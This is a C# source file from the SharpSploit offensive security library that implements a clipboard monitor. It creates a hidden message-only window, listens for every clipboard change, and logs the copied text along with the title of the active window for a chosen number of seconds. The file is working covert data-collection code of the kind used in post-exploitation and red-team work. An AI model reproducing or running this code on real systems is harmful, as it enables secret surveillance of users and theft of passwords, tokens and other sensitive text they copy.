// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Enumeration
{
    /// <summary>
    /// Clipboard allows for the monitoring of Clipboard text content.
    /// </summary>
    public class Clipboard
    {
        /// <summary>
        /// Starts a clipboard monitor
        /// </summary>
        /// <author>Nick Muir (@_shellfarmer)</author>
        /// <returns>String containing the captured clipboard contents, along with identification of what window they were copied from.</returns>
        /// <param name="Seconds">The amount of time in seconds the clipboard monitor should run for before returning data.</param>
        public static string StartClipboardMonitor(int Seconds)
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine(string.Format("[*] Starting Clipboard Monitor for {0} seconds.", Seconds));
            builder.AppendLine();

            if (Seconds <= 0)
            {
                NotificationForm form = new NotificationForm();
                Application.Run(form);
                builder.Append(form.GetOutput());
                return builder.ToString();
            }
            else
            {
                using (System.Timers.Timer timer = new System.Timers.Timer(Seconds * 1000))
                {
                    timer.Elapsed += (source, e) =>
                    {
                        builder.AppendLine(string.Format("[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
                        timer.Stop();
                        Application.Exit();
                    };
                    timer.Start();
                    NotificationForm form = new NotificationForm();
                    Application.Run(form);
                    builder.Append(form.GetOutput());
                    return builder.ToString();
                }
            }
        }

        private class NotificationForm : Form
        {
            private readonly StringBuilder Builder = new StringBuilder();
            public NotificationForm()
            {
                PInvoke.Win32.User32.SetParent(Handle, new IntPtr(-3));
                PInvoke.Win32.User32.AddClipboardFormatListener(Handle);
            }

            public string GetOutput()
            {
                return this.Builder.ToString();
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == 0x031D)
                {
                    Thread t = new Thread(() => {
                        if (System.Windows.Forms.Clipboard.ContainsText())
                        {
                            Builder.AppendLine(string.Format("[+] Collected: {0:HH:mm:ss.fff}", DateTime.Now));
                            Builder.AppendLine(string.Format("[+] Window Title: {0}", GetActiveWindowTitle()));
                            Builder.AppendLine("[+] Data:");
                            Builder.AppendLine(string.Format("{0}", System.Windows.Forms.Clipboard.GetText()));
                            Builder.AppendLine();
                        }
                    });

                    t.SetApartmentState(ApartmentState.STA);
                    t.Start();
                    t.Join();
                }
                base.WndProc(ref m);
            }
        }

        /// <summary>
        /// Gets the active window title of the window keystrokes are being entered in.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>Title of the active window.</returns>
        private static string GetActiveWindowTitle()
        {
            const int capacity = 256;
            StringBuilder builder = new StringBuilder(capacity);
            IntPtr handle = PInvoke.Win32.User32.GetForegroundWindow();

            if (PInvoke.Win32.User32.GetWindowText(handle, builder, capacity) > 0)
            {
                return builder.ToString();
            }
            return null;
        }
    }
}
